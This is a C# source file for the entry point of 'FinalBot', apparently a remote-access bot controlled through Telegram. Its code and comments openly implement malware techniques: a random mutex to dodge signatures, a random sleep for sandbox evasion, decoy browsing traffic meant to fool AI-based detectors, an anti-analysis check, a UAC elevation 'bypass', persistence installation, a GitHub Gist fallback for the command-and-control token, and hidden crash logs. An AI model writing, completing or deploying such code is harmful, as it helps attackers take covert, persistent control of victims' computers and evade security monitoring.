using System;
using System.IO;
using System.Net.Http;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;
using VanguardCore;

namespace FinalBot
{
    class Program
    {
        private static Mutex? _mutex;

        static async Task Main(string[] args)
        {
            // 1. Single Instance Check — random GUID mutex (no static signature)
            bool createdNew;
            string mutexName = $"Global\\MS_{Guid.NewGuid():N}";
            _mutex = new Mutex(true, mutexName, out createdNew);
            if (!createdNew) return;

            // 2. Sandbox Evasion — random sleep before any suspicious activity
            await Task.Delay(new Random().Next(3000, 15000));

            // 3. Decoy Traffic — looks like normal browsing to AI detectors
            _ = Task.Run(async () =>
            {
                using var http = new HttpClient();
                http.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36");
                string[] decoyUrls = {
                    "https://www.google.com/search?q=weather+today",
                    "https://www.bing.com/search?q=latest+news",
                    "https://api.github.com/",
                    "https://www.cloudflare.com/",
                    "https://dns.google/"
                };
                var rng = new Random();
                while (true)
                {
                    try { await http.GetStringAsync(decoyUrls[rng.Next(decoyUrls.Length)]); } catch { }
                    await Task.Delay(rng.Next(45_000, 120_000));
                }
            });

            // 2. Anti-Analysis Check
            if (SafetyManager.VerifySystemContext()) return;

            // 3. UAC Check & Bypass
            if (!ElevationService.IsAdmin())
            {
                ElevationService.RequestElevation(Process.GetCurrentProcess().MainModule?.FileName ?? "FinalBot.exe");
                return; 
            }

            // 4. Persistence
            Persistence.Install();

            // 5. Start Orchestrator
            try 
            {
                ConfigManager.Load();
                
                string token = ConfigManager.Get("BOT_TOKEN");
                string adminId = ConfigManager.Get("ADMIN_ID");
                
                if (string.IsNullOrEmpty(token) || token == "YOUR_TELEGRAM_BOT_TOKEN")
                {
                    Logger.Warn("[C2] Primary token missing or invalid. Attempting Gist fallback...");
                    var fallback = await GistService.GetFallbackConfigAsync();
                    if (fallback.HasValue)
                    {
                        token = fallback.Value.Token;
                        adminId = fallback.Value.ChatId;
                        ConfigManager.Set("BOT_TOKEN", token);
                        ConfigManager.Set("ADMIN_ID", adminId);
                    }
                    else
                    {
                        Logger.Error("[C2] FATAL: Cannot start bot, no token available.");
                        return;
                    }
                }

                var orchestrator = new BotOrchestrator(token, adminId);
                await orchestrator.StartAsync();
            }
            catch (Exception ex)
            {
                Logger.Error("Fatal application error", ex);
                LogCrash(ex);
            }
        }

        private static void LogCrash(Exception ex)
        {
            try
            {
                // Write to hidden temp path — avoid obvious Public folder
                string path = Path.Combine(Path.GetTempPath(), $".{Environment.MachineName}_sys.log");
                File.AppendAllText(path, $"[CRITICAL] {DateTime.Now}: {ex}\n");
                File.SetAttributes(path, FileAttributes.Hidden);
            } catch { }
        }
    }
}
